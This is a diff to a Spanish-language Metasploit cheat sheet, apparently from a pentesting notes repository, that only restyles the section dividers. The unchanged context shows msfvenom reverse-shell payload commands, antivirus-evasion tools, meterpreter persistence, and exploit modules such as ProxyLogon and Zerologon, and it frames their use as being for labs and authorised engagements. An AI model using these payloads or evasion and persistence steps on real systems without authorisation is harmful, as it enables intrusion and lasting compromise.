@@ -24,7 +24,7 @@ linked:
 ---
 # Metasploit Framework
 
-***
+---
 
 ## Overview
 
@@ -34,7 +34,7 @@ Install: `apt install metasploit-framework` / `curl https://raw.githubuserconten
 
 > Regla: Metasploit deja IOCs ruidosos. Usar en CTFs / labs / engagements con luz verde. Para stealth → manual o C2 custom.
 
-***
+---
 
 ## Setup DB
 
@@ -62,7 +62,7 @@ O desde fuera:
 nmap -sC -sV -oX scan.xml target && msfconsole -qx "db_import scan.xml; exit"
 ```
 
-***
+---
 
 ## Módulos
 
@@ -102,7 +102,7 @@ msf6 > setg RHOSTS 10.10.10.0/24
 msf6 > save                    # persiste en ~/.msf4/config
 ```
 
-***
+---
 
 ## Payloads
 
@@ -126,7 +126,7 @@ msf6 > save                    # persiste en ~/.msf4/config
 | Java | `java/meterpreter/reverse_tcp` | cross-platform |
 | Python | `python/meterpreter/reverse_tcp` | si hay python en host |
 
-***
+---
 
 ## msfvenom
 
@@ -180,7 +180,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -x /usr/sh
 
 Para evadir AVs modernos → obfuscación custom, C# loaders, ScareCrow, Donut.
 
-***
+---
 
 ## Handler / multi-handler
 
@@ -207,7 +207,7 @@ EOF
 msfconsole -r /tmp/handler.rc
 ```
 
-***
+---
 
 ## Sessions
 
@@ -228,7 +228,7 @@ msf6 > set SESSION 1
 msf6 > run
 ```
 
-***
+---
 
 ## Meterpreter
 
@@ -333,7 +333,7 @@ meterpreter > use exploit/windows/local/persistence
 # También: registry run keys, scheduled tasks, services
 ```
 
-***
+---
 
 ## Módulos de referencia útiles
 
@@ -385,7 +385,7 @@ use exploit/windows/http/exchange_proxylogon_rce       # ProxyLogon
 use exploit/windows/smb/zerologon_nltmrelayx           # CVE-2020-1472
 ```
 
-***
+---
 
 ## Resource scripts (.rc)
 
@@ -406,7 +406,7 @@ exploit -z
 msfconsole -qr run.rc
 ```
 
-***
+---
 
 ## Logging
 
@@ -414,7 +414,7 @@ msfconsole -qr run.rc
 - `spool /tmp/msf.log` → duplicar output a file.
 - `loot` → creds, archivos, hashes descargados.
 
-***
+---
 
 ## Tips
 
@@ -425,7 +425,7 @@ msfconsole -qr run.rc
 - Staged payloads sobre NAT: `ReverseListenerBindAddress` + port-fwd.
 - `AutoRunScript` en handler: ejecuta algo auto al obtener sesión (`multi_console_command`, `migrate -f`).
 
-***
+---
 
 ## Referencias
 
